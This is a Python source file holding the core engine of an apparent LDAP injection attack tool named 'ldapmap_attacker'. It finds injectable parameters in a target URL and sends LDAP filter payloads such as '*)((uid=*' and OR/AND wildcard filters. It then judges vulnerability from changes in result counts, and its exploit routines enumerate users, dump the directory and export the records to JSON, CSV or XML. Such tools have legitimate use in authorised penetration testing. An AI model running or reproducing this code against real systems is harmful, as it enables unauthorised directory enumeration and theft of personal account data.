import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

from ldapmap_attacker.core.session import Session, AttackResult
from ldapmap_attacker.lib.logger import setup_logger
from ldapmap_attacker.lib.requester import Requester
from ldapmap_attacker.lib.utils import find_injection_points, replace_param_in_url
from ldapmap_attacker.plugins.base import PluginManager

logger = setup_logger()


class Engine:
    def __init__(self, session):
        self.session = session
        self.requester = None
        self.plugin_manager = PluginManager()
        self.baseline_stable = False
        self.baseline_results_count = 0

    def setup(self):
        logger.info("Initializing LDAPMap engine...")

        self.requester = Requester(
            timeout=self.session.timeout,
            retries=self.session.retries,
            delay=self.session.delay,
            proxy=self.session.proxy,
            headers=self.session.headers,
            cookies=self.session.cookies,
            verify_ssl=self.session.verify_ssl
        )

        self._identify_injection_points()

        if not self.session.injection_point:
            if self.session.force:
                logger.warning("No injectable parameters found but --force specified")
                logger.warning("Using generic 'INPUT' injection point - this may not work!")
                logger.warning("For proper testing, use a URL with explicit parameters:")
                logger.warning("  Example: -u \"https://target.com/search?user=INPUT\"")
                logger.warning("  Example: -u \"https://target.com/api\" --data=\"username=INPUT\"")
                self.session.injection_point = "INPUT"
            else:
                logger.error("No injectable parameters found in target URL or POST data")
                logger.error("LDAPMap requires explicit parameters (e.g., ?user=value)")
                logger.error("Use --force to override (not recommended)")
                return False

        if not self._validate_ldap_surface():
            if self.session.force:
                logger.warning("LDAP validation failed but --force specified - continuing anyway")
            else:
                logger.error("LDAP backend not detected - aborting to prevent useless fuzzing")
                logger.error("If you're sure this is LDAP, use --force to override")
                return False

        self._establish_stable_baseline()

        if not self.baseline_stable:
            logger.warning("Target appears unstable - results may be unreliable")

        logger.success(f"Engine ready")
        logger.info(f"Injection point detected: {self.session.injection_point}")
        if self.session.post_data:
            logger.info(f"POST data parameter: {self.session.injection_point}")
        logger.info(f"Detectors: {', '.join(self.session.detectors)}")
        logger.info(f"Payloads: {', '.join(self.session.payloads)}")

        return True

    def _identify_injection_points(self):
        points = find_injection_points(self.session.target_url, self.session.post_data)

        if points:
            self.session.injection_point = list(points.keys())[0]
        else:
            parsed = urllib.parse.urlparse(self.session.target_url)
            if parsed.query:
                params = urllib.parse.parse_qs(parsed.query)
                if params:
                    self.session.injection_point = list(params.keys())[0]
            else:
                self.session.injection_point = None

    def _validate_ldap_surface(self):
        if not self.session.injection_point:
            logger.error("No injection point found - target has no identifiable parameters")
            return False

        parsed = urllib.parse.urlparse(self.session.target_url)
        url_path = parsed.path.lower()
        query_params = urllib.parse.parse_qs(parsed.query)

        ldap_path_patterns = ["/ldap", "/search", "/directory", "/auth", "/login", "/api/"]
        if any(pattern in url_path for pattern in ldap_path_patterns):
            logger.info(f"LDAP-like URL path detected: {parsed.path}")
            path_score = 30
        else:
            path_score = 0

        ldap_param_names = ["cn", "uid", "dn", "ou", "dc", "memberof", "objectclass"]
        param_score = 0
        for param in query_params:
            if param.lower() in ldap_param_names:
                logger.info(f"LDAP attribute parameter detected: {param}")
                param_score += 35

        if path_score + param_score >= 35:
            logger.info(f"High confidence LDAP target (score: {path_score + param_score}) - validating with test payloads...")

            test_payloads = [
                ("*)((uid=*", "LDAP syntax test"),
                ("(objectClass=*)", "ObjectClass test"),
                ("admin", "baseline probe"),
            ]

            for payload, desc in test_payloads:
                response = self._make_request(payload)
                if not response:
                    continue

                resp_lower = response.text.lower()

                if any(err in resp_lower for err in ["invalid syntax", "malformed filter", "bad search filter", "ldap error"]):
                    logger.info("LDAP error confirmed in response - target uses LDAP backend")
                    return True

                for indicator in ["ldap", "uid", "cn", "objectclass"]:
                    if indicator in resp_lower:
                        logger.debug(f"LDAP indicator in response: {indicator}")

            logger.info("LDAP target likely (no errors leaked - target may have proper error handling)")
            return True

        logger.warning("Could not confirm LDAP backend - target may not be LDAP-based")
        logger.warning("Detected parameters don't match common LDAP attribute names")
        return False

    def _make_request(self, value):
        if self.session.method == "GET":
            url = replace_param_in_url(
                self.session.target_url,
                self.session.injection_point,
                value
            )
            data = None
        else:
            url = self.session.target_url
            data = replace_param_in_url(
                f"http://dummy?{self.session.post_data}",
                self.session.injection_point,
                value
            ).split("?")[1] if self.session.post_data else f"{self.session.injection_point}={value}"

        try:
            return self.requester.request(self.session.method, url, data)
        except Exception as e:
            logger.debug(f"Request failed for value '{value}': {e}")
            return None

    def _count_results(self, response_text):
        patterns = [
            r'Results? \((\d+) found\)',
            r'"count":\s*(\d+)',
            r'"results":\s*\[',
            r'<tr>.*?<td>.*?</td>.*?</tr>',
            r'uid["\']?\s*[=:]',
            r'cn["\']?\s*[=:]',
        ]

        count = 0
        for pattern in patterns[:2]:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                try:
                    return int(matches[0])
                except:
                    pass

        entries = re.findall(r'uid["\']?\s*[=:]', response_text, re.IGNORECASE)
        if entries:
            return len(entries)

        entries = re.findall(r'cn["\']?\s*[=:]', response_text, re.IGNORECASE)
        if entries:
            return len(entries)

        return count

    def _establish_stable_baseline(self):
        test_values = ["admin", "testuser123", "nonexistent_xyz"]
        results_counts = []

        for test_value in test_values:
            response = self._make_request(test_value)
            if response:
                count = self._count_results(response.text)
                results_counts.append(count)

        if len(results_counts) >= 2:
            if results_counts[0] == results_counts[1]:
                self.baseline_stable = True
                self.baseline_results_count = results_counts[0]
                logger.debug(f"Stable baseline: {self.baseline_results_count} results")
            else:
                self.baseline_stable = False
                self.baseline_results_count = results_counts[0]
                logger.debug(f"Unstable baseline: varying result counts")
        else:
            self.baseline_stable = False
            logger.debug("Could not establish baseline")

    def _is_boolean_injection(self, payload):
        true_patterns = [
            r'\*\)', r'\)\(&', r'\|\(', r'\*\)\(', r'objectClass=\*',
            r'\)\(', r'\*\)\)\(', r'\*\)\%00', r'\)\%00',
        ]

        for pattern in true_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return True, "true_condition"

        return False, ""

    def run(self):
        if not self.setup():
            return False

        self.session.start()

        all_payloads = self._load_payloads()
        detectors = self._load_detectors()

        if not all_payloads:
            logger.error("No payloads to test - aborting")
            return False

        if len(all_payloads) > 500:
            logger.warning(f"Large payload count ({len(all_payloads)}) - consider using --technique to narrow scope")

        logger.info(f"Testing {len(all_payloads)} payloads with {len(detectors)} detectors")

        with ThreadPoolExecutor(max_workers=self.session.threads) as executor:
            futures = {
                executor.submit(self._test_payload, payload, detectors): payload
                for payload in all_payloads
            }

            for future in as_completed(futures):
                payload = futures[future]
                try:
                    result = future.result()
                    if result:
                        self.session.add_result(result)
                        if result.vulnerable:
                            self._log_vulnerability(result)
                except Exception as e:
                    logger.debug(f"Test failed for payload {payload[0]}: {e}")

        self.session.stop()
        self._print_summary()

    def _probe_target_context(self):
        logger.info("Probing target to identify applicable attack vectors...")

        context = {
            "has_auth_form": False,
            "has_search": False,
            "ldap_error_leak": False,
            "is_ad": False,
            "is_openldap": False,
        }

        test_probes = [
            ("admin", "probe"),
            ("*)(uid=*", "syntax"),
            ("(objectClass=*)", "filter"),
        ]

        for payload, probe_type in test_probes:
            response = self._make_request(payload)
            if not response:
                continue

            resp_text = response.text.lower()

            if probe_type == "probe":
                if "login" in resp_text or "auth" in resp_text or "password" in resp_text:
                    context["has_auth_form"] = True
                if "search" in resp_text or "query" in resp_text or "results" in resp_text:
                    context["has_search"] = True

            if "invalid syntax" in resp_text or "malformed filter" in resp_text:
                context["ldap_error_leak"] = True

            if "samaccountname" in resp_text or "userprincipalname" in resp_text:
                context["is_ad"] = True
            if "uidnumber" in resp_text or "posixaccount" in resp_text:
                context["is_openldap"] = True

        logger.info(f"Target profile: auth={context['has_auth_form']}, search={context['has_search']}, AD={context['is_ad']}, OpenLDAP={context['is_openldap']}")

        return context

    def _select_payloads_by_context(self, all_payloads, context):
        if not all_payloads:
            return []

        selected = []

        for payload_data in all_payloads:
            payload, ptype, desc = payload_data

            if context["has_auth_form"] and ptype in ["bypass", "wildcard", "null", "comment"]:
                selected.append(payload_data)
            elif context["has_search"] and ptype in ["enum", "attr", "complex"]:
                selected.append(payload_data)
            elif context["ldap_error_leak"] and ptype in ["error", "syntax"]:
                selected.append(payload_data)
            elif context["is_ad"] and any(x in payload.lower() for x in ["samaccountname", "userprincipalname", "memberof"]):
                selected.append(payload_data)
            elif context["is_openldap"] and any(x in payload.lower() for x in ["uidnumber", "posixaccount", "gidnumber"]):
                selected.append(payload_data)
            elif ptype in ["std", "probe"]:
                selected.append(payload_data)

        if not selected:
            logger.warning("No payloads matched target context - using first 50 as fallback")
            selected = all_payloads[:50]

        return selected

    def _load_payloads(self):
        all_payloads = []

        for payload_name in self.session.payloads:
            plugin_class = self.plugin_manager.get_payload(payload_name)
            if plugin_class:
                plugin = plugin_class()
                payloads = plugin.generate()
                all_payloads.extend(payloads)
                logger.debug(f"Loaded {len(payloads)} payloads from {payload_name}")
            else:
                logger.warning(f"Unknown payload plugin: {payload_name}")

        context = self._probe_target_context()

        if not context["ldap_error_leak"] and not context["is_ad"] and not context["is_openldap"]:
            if not self.session.force:
                logger.error("=" * 60)
                logger.error("IMPOSSIBLE TO TEST: Target does not appear to be LDAP-based")
                logger.error("No LDAP error messages, AD indicators, or OpenLDAP signs detected")
                logger.error("Testing a non-LDAP target with LDAP payloads is pointless")
                logger.error("=" * 60)
                logger.error("Aborting scan. Use --force to override (not recommended)")
                return []
            else:
                logger.warning("No LDAP indicators detected but --force specified")
                logger.warning("Testing anyway - expect 100% false negatives")

        selected = self._select_payloads_by_context(all_payloads, context)

        logger.info(f"Selected {len(selected)} context-relevant payloads from {len(all_payloads)} total")

        if self.session.max_payloads and len(selected) > self.session.max_payloads:
            logger.info(f"Further limiting to {self.session.max_payloads} payloads")
            selected = selected[:self.session.max_payloads]

        return selected

    def _load_detectors(self):
        detectors = []

        for detector_name in self.session.detectors:
            plugin_class = self.plugin_manager.get_detector(detector_name)
            if plugin_class:
                plugin = plugin_class()
                detectors.append(plugin)
                logger.debug(f"Loaded detector: {detector_name}")
            else:
                logger.warning(f"Unknown detector plugin: {detector_name}")

        return detectors

    def _test_payload(self, payload_data, detectors):
        payload, payload_type, description = payload_data

        start_time = time.time()
        response = self._make_request(payload)
        response_time = time.time() - start_time

        if not response:
            return None

        result_count = self._count_results(response.text)

        is_vulnerable = False
        evidence = {
            "payload": payload,
            "payload_type": payload_type,
            "result_count": result_count,
            "baseline_count": self.baseline_results_count,
            "detectors": []
        }

        if payload in ["admin", "*", "*)(uid=*", "*)(objectClass=*"]:
            pass

        is_bool_true, bool_reason = self._is_boolean_injection(payload)

        has_logic_change = False
        if is_bool_true:
            if result_count > self.baseline_results_count:
                has_logic_change = True
                evidence["boolean_test"] = "true_condition_expanded"
                evidence["logic_change"] = f"Results increased: {self.baseline_results_count} -> {result_count}"

        if result_count > self.baseline_results_count + 2 and is_bool_true:
            has_logic_change = True
            evidence["anomaly"] = "significant_result_increase"

        has_error_evidence = False
        for detector in detectors:
            detected, det_evidence = detector.detect(response, payload, "")
            if detected:
                has_error_evidence = True
                evidence["detectors"].append({
                    "name": detector.name,
                    "evidence": det_evidence
                })

        has_ldap_error = False
        resp_lower = response.text.lower()

        ldap_error_patterns = [
            r"ldap_search.*failed",
            r"invalid.*ldap.*syntax",
            r"malformed.*ldap.*filter",
            r"bad.*search.*filter",
            r"ldap.*operations.*error",
            r"size.*limit.*exceeded",
            r"time.*limit.*exceeded",
            r"no.*such.*object",
            r"undefined.*attribute.*type",
        ]

        for pattern in ldap_error_patterns:
            if re.search(pattern, resp_lower):
                has_ldap_error = True
                evidence["ldap_error_leak"] = pattern
                break

        is_server_error = response.status_code >= 500

        confidence = "none"
        if has_logic_change and result_count > self.baseline_results_count + 5:
            confidence = "high"
        elif has_logic_change:
            confidence = "medium"
        elif is_server_error and has_ldap_error and is_bool_true:
            confidence = "medium"
        elif is_server_error and has_ldap_error:
            confidence = "low"

        evidence["confidence"] = confidence

        is_vulnerable = confidence in ["high", "medium"]

        if has_ldap_error and confidence == "none":
            logger.debug(f"LDAP error text found but insufficient evidence (HTTP {response.status_code}, no boolean change)")

        return AttackResult(
            payload=payload,
            payload_type=payload_type,
            vulnerable=is_vulnerable,
            url=response.url,
            status_code=response.status_code,
            response_time=response_time,
            evidence=evidence
        )

    def _log_vulnerability(self, result):
        evidence = result.evidence
        confidence = evidence.get("confidence", "unknown")

        if confidence == "high":
            logger.vuln(f"CONFIRMED LDAP INJECTION | {result.payload}")
        elif confidence == "medium":
            logger.warning(f"POTENTIAL LDAP INJECTION (verify manually) | {result.payload}")
        else:
            logger.info(f"SUSPICIOUS RESPONSE (not confirmed) | {result.payload}")

        logger.info(f"  Type: {result.payload_type}")
        logger.info(f"  Confidence: {confidence}")

        if "logic_change" in evidence:
            logger.info(f"  Logic: {evidence['logic_change']}")
            logger.info(f"  Note: Result count change suggests query modification")
        if "anomaly" in evidence:
            logger.info(f"  Anomaly: {evidence['anomaly']}")
        if "ldap_error_leak" in evidence:
            logger.info(f"  LDAP error pattern: {evidence['ldap_error_leak']}")
            logger.info(f"  Note: Error message alone is NOT proof of injection")

        for detector_info in evidence.get("detectors", []):
            det_name = detector_info["name"]
            det_ev = detector_info["evidence"]

            if det_name == "ErrorBasedDetector":
                errors = det_ev.get("errors_found", [])
                if errors:
                    logger.info(f"  Detected error strings: {', '.join(errors[:2])}")

    def _print_summary(self):
        summary = self.session.get_summary()
        all_results = self.session.results

        high_conf = [r for r in all_results if r.vulnerable and r.evidence.get("confidence") == "high"]
        medium_conf = [r for r in all_results if r.vulnerable and r.evidence.get("confidence") == "medium"]

        print()
        print("-" * 60)
        print(f"Scan Complete | {summary['target']}")
        print(f"Tests: {summary['tests_count']} | Time: {summary['duration_seconds']:.1f}s")
        print("-" * 60)

        if high_conf:
            print(f"\n[CONFIRMED] High confidence LDAP injection: {len(high_conf)} findings")
            print("  These require immediate attention and manual verification")

        if medium_conf:
            print(f"\n[SUSPICIOUS] Medium confidence findings: {len(medium_conf)}")
            print("  Requires manual verification before concluding exploitation")

        if not high_conf and not medium_conf:
            print("\n[RESULT] No high/medium confidence LDAP injection detected")
            print("  Low confidence anomalies may exist but are not confirmed vulnerabilities")

        print(f"\n  Injection point: {self.session.injection_point}")
        print(f"  Method: {self.session.method}")
        print()
        print("[!] Important: Always verify findings manually before reporting")
        print("[!] Correlation does not imply causation - validate server-side")
        print()

    def has_vulnerabilities(self):
        for r in self.session.results:
            if r.vulnerable and r.evidence.get("confidence") in ["high", "medium"]:
                return True
        return False

    def assess_capabilities(self):
        logger.info("Testing exploitation capabilities...")

        high_conf = [r for r in self.session.results if r.vulnerable and r.evidence.get("confidence") == "high"]
        medium_conf = [r for r in self.session.results if r.vulnerable and r.evidence.get("confidence") == "medium"]

        capabilities = {
            "boolean_based": {"available": False, "note": "Cannot determine true/false conditions"},
            "error_based": {"available": False, "note": "No LDAP error messages leaked"},
            "enumeration": {"available": False, "note": "Cannot expand result sets predictably"},
            "attribute_extraction": {"available": False, "note": "No confirmed attribute reflection"},
        }

        if not high_conf and not medium_conf:
            return capabilities

        for result in high_conf + medium_conf:
            ev = result.evidence

            if "logic_change" in ev:
                capabilities["boolean_based"]["available"] = True
                capabilities["boolean_based"]["note"] = "Result count changes with payload logic"
                capabilities["enumeration"]["available"] = True
                capabilities["enumeration"]["note"] = "Can expand/diff result sets"

            if "ldap_error_leak" in ev:
                capabilities["error_based"]["available"] = True
                capabilities["error_based"]["note"] = "LDAP error messages reflected"

            if result_count := ev.get("result_count"):
                if result_count > 0:
                    capabilities["attribute_extraction"]["available"] = True
                    capabilities["attribute_extraction"]["note"] = f"Retrieved {result_count} result entries"

        logger.info("Capability assessment complete")

        if not self._validate_backend_proof(capabilities):
            if self.session.ignore_backend_proof:
                logger.warning("Backend validation failed but --ignore-backend-proof specified")
                logger.warning("Continuing anyway - may target mock API or fake data")
            else:
                logger.error("=" * 60)
                logger.error("BACKEND VALIDATION FAILED")
                logger.error("=" * 60)
                logger.error("Cannot prove target uses real LDAP backend")
                logger.error("Responses may be:")
                logger.error("  - Mock API responses (fake data)")
                logger.error("  - Frontend-only rendering (no LDAP query)")
                logger.error("  - Cached/paginated results (not live LDAP)")
                logger.error("  - WAF sanitized output")
                logger.error("=" * 60)
                logger.error("To proceed anyway (not recommended): use --ignore-backend-proof")
                return None

        confidence_score = self._calculate_confidence_score(capabilities)
        if confidence_score < 50:
            logger.warning(f"Low confidence score: {confidence_score}/100")
            logger.warning("Missing key LDAP indicators - exploitation may fail")
            capabilities["_metadata"] = {"confidence_score": confidence_score, "risk": "high"}
        else:
            capabilities["_metadata"] = {"confidence_score": confidence_score, "risk": "medium"}

        return capabilities

    def _validate_backend_proof(self, capabilities):
        logger.info("Validating backend LDAP proof...")

        if not capabilities.get("attribute_extraction", {}).get("available"):
            logger.debug("No attribute extraction capability - cannot validate backend")
            return False

        ldap_structures = [
            r"dn:\s*\w+",
            r"cn=\w+,\s*(ou|dc)=",
            r"uid=\w+,\s*(ou|dc)=",
            r"objectclass:\s*\w+",
            r"\"objectClass\":\s*\[",
            r"\"dn\":\s*\"",
            r"\"uid\":\s*\"",
            r"\"cn\":\s*\"",
        ]

        sample_payloads = ["cn=*", "uid=*", "(objectClass=person)"]

        proofs_found = 0
        for payload in sample_payloads:
            response = self._make_request(payload)
            if not response:
                continue

            resp_text = response.text

            for pattern in ldap_structures:
                if re.search(pattern, resp_text, re.IGNORECASE):
                    logger.info(f"LDAP structure detected: {pattern[:40]}...")
                    proofs_found += 1
                    if proofs_found >= 2:
                        logger.success("Backend LDAP proof validated (2+ LDAP structures)")
                        return True

            if "uid" in resp_text.lower() and "cn" in resp_text.lower():
                if re.search(r"\w+:\s*\w+", resp_text):
                    logger.info("Potential LDAP attribute:value pattern found")
                    proofs_found += 1

        if proofs_found == 0:
            logger.warning("No LDAP structures found in responses")
            logger.warning("Target may return generic JSON/HTML without LDAP DN/attributes")
            return False

        logger.warning(f"Only {proofs_found} weak LDAP indicator(s) - insufficient proof")
        logger.warning("Attempting semantic LDAP validation (AND/OR filter logic)...")

        return self._validate_ldap_semantics()

    def _validate_ldap_semantics(self):
        logger.info("Testing LDAP filter logic semantics...")

        baseline = self._make_request("admin")
        if not baseline:
            logger.debug("Cannot establish baseline for semantic tests")
            return False

        baseline_count = self._count_results(baseline.text)
        logger.debug(f"Semantic test baseline: {baseline_count} results")

        and_tests = [
            "(&(cn=admin)(objectClass=*))",
            "(&(cn=*)(uid=*))",
        ]

        or_tests = [
            "(|(cn=admin)(cn=root))",
            "(|(uid=*)(cn=*))",
        ]

        and_confirmations = 0
        or_confirmations = 0

        for payload in and_tests:
            response = self._make_request(payload)
            if not response:
                continue
            count = self._count_results(response.text)

            if count < baseline_count:
                logger.info(f"AND filter semantics confirmed: {payload}")
                logger.info(f"  Baseline: {baseline_count} → AND result: {count} (restrictive)")
                and_confirmations += 1

        for payload in or_tests:
            response = self._make_request(payload)
            if not response:
                continue
            count = self._count_results(response.text)

            if count > baseline_count:
                logger.info(f"OR filter semantics confirmed: {payload}")
                logger.info(f"  Baseline: {baseline_count} → OR result: {count} (expansive)")
                or_confirmations += 1

        if and_confirmations >= 1 and or_confirmations >= 1:
            logger.success("LDAP semantics validated: AND restrictive, OR expansive")
            return True

        if and_confirmations >= 1 or or_confirmations >= 1:
            logger.warning(f"Partial LDAP semantics: AND={and_confirmations}, OR={or_confirmations}")
            return False

        logger.error("No LDAP filter logic detected - backend likely NOT LDAP")
        logger.error("Responses don't follow LDAP AND/OR filter semantics")
        return False

    def _calculate_confidence_score(self, capabilities):
        score = 0

        if capabilities.get("boolean_based", {}).get("available"):
            score += 30
        if capabilities.get("error_based", {}).get("available"):
            score += 25
        if capabilities.get("enumeration", {}).get("available"):
            score += 20
        if capabilities.get("attribute_extraction", {}).get("available"):
            score += 15

        if not self.baseline_stable:
            score -= 20
            logger.debug("Confidence penalty: unstable baseline")

        high_conf_count = len([r for r in self.session.results if r.vulnerable and r.evidence.get("confidence") == "high"])
        if high_conf_count >= 3:
            score += 10
        elif high_conf_count == 0:
            score -= 15
            logger.debug("Confidence penalty: no high-confidence findings")

        return max(0, min(100, score))

    def get_exploiter(self):
        from ldapmap_attacker.core.exploitation import LDAPExploiter
        return LDAPExploiter(
            requester=self.requester,
            method=self.session.method,
            target_url=self.session.target_url,
            injection_point=self.session.injection_point,
            post_data=self.session.post_data
        )

    def exploit(self, enum_users: bool = False, dump: bool = False, export_format: str = None, output_dir: str = "./output"):
        high_conf = [r for r in self.session.results if r.vulnerable and r.evidence.get("confidence") == "high"]
        medium_conf = [r for r in self.session.results if r.vulnerable and r.evidence.get("confidence") == "medium"]

        if not high_conf and not medium_conf:
            logger.error("Cannot exploit - no confirmed vulnerabilities found")
            logger.error("Run scan first and verify findings manually")
            return None

        if not high_conf:
            logger.warning("No HIGH confidence findings - only medium confidence detected")
            logger.warning("Exploitation may fail or produce unreliable results")
            logger.warning("Consider manual verification before proceeding")

        logger.info(f"Exploiting based on {len(high_conf)} high + {len(medium_conf)} medium confidence findings")
        logger.warning("[!] Data extraction may be partial or inaccurate")
        logger.warning("[!] Validate extracted data against expected schema")

        from ldapmap_attacker.core.exploitation import LDAPExploiter

        exploiter = LDAPExploiter(
            requester=self.requester,
            method=self.session.method,
            target_url=self.session.target_url,
            injection_point=self.session.injection_point,
            post_data=self.session.post_data
        )

        all_data = {}
        users = []

        if enum_users or dump:
            logger.info("Attempting user enumeration...")
            users = exploiter.enum_users()
            if users:
                logger.info(f"Retrieved {len(users)} entries (may include incomplete/partial data)")
            else:
                logger.warning("No users enumerated - injection may not be exploitable")
            all_data["users"] = users

        if dump:
            logger.info("Attempting database dump...")
            logger.warning("[!] This is an aggressive operation")
            full_dump = exploiter.dump_database()
            all_data.update(full_dump)

        if export_format and users:
            from ldapmap_attacker.core.exporter import DataExporter
            exporter = DataExporter(output_dir)
            if export_format == "json":
                exporter.export_json(users)
            elif export_format == "csv":
                exporter.export_csv(users)
            elif export_format == "xml":
                exporter.export_xml(users)
            elif export_format == "all":
                exporter.export_all(users)

        return users if users else all_data

    def cleanup(self):
        if self.requester:
            self.requester.close()
